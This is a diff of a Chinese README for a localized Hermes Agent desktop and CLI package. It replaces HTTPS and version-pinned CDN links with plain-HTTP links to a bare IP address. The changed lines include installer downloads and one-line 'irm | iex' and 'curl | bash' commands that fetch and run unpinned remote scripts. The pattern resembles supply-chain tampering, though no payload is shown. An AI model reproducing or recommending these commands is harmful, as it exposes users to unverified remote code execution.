@@ -2,17 +2,17 @@
 
 面向 Hermes Desktop、Hermes Agent TUI 和 CLI 的中文增强入口。
 
-官网入口：<https://useai.live/hermes/>
+官网入口：<http://47.121.138.43/hermes/>
 
 ## 新手安装
 
 Windows：
 
-下载并运行：<https://useai.live/hermes/Hermes-zh-CN-Setup.exe>
+下载并运行：<http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe>
 
 macOS：
 
-下载并解压：<https://useai.live/hermes/hermes-macos-installer.zip>
+下载并解压：<http://47.121.138.43/hermes/hermes-macos-installer.zip>
 
 然后打开 `install.command`。
 
@@ -21,13 +21,13 @@ macOS：
 Windows PowerShell：
 
 ```powershell
-irm https://cdn.jsdelivr.net/gh/fresh-claw/hermes-cn@v2026.06.07.1/install.ps1 | iex
+irm http://47.121.138.43/hermes/install.ps1 | iex
 ```
 
 macOS / Linux / WSL2：
 
 ```bash
-curl -fsSL https://cdn.jsdelivr.net/gh/fresh-claw/hermes-cn@v2026.06.07.1/install.sh | bash -s -- --include-desktop
+curl -fsSL http://47.121.138.43/hermes/install.sh | bash -s -- --include-desktop
 ```
 
 ## 平台策略
@@ -58,8 +58,8 @@ curl -fsSL https://cdn.jsdelivr.net/gh/fresh-claw/hermes-cn@v2026.06.07.1/instal
 
 ## 版本
 
-- 桌面入口：2026.06.07.1
-- 中文包：2026.06.07.1
+- 桌面入口：2026.06.07.2
+- 中文包：2026.06.07.2
 - 官方 Hermes Agent：v0.15.2
 
 ## 上游
